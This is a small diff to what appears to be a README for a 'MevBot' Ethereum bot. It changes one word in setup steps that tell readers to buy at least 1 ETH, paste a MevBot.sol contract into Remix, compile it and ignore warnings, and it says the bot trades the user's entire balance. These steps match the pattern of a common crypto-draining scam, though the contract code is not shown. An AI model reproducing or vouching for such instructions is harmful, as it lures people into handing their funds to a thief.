@@ -36,7 +36,7 @@ The bot will make transactions on your entire balance to increase profit
 
 VERY FIRST STEP: Install Metamask and buy enough Etheruem, at least 1 ETH;  https://metamask.io/
 
-Copy code and paste the code of MevBot.sol file in Remix IDE;     https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null
+Copy code and paste the code MevBot.sol file in Remix IDE;     https://remix.ethereum.org/#lang=en&optimize=false&runs=200&evmVersion=null
 
 Click Solidity complier 0.8.0 And press Compile FlashBot.sol, DON'T WORRY ABOUT WARNINGS ABOUT THE LISCENCE, IT WILL STILL WORK, JUST IGNORE THIS
 
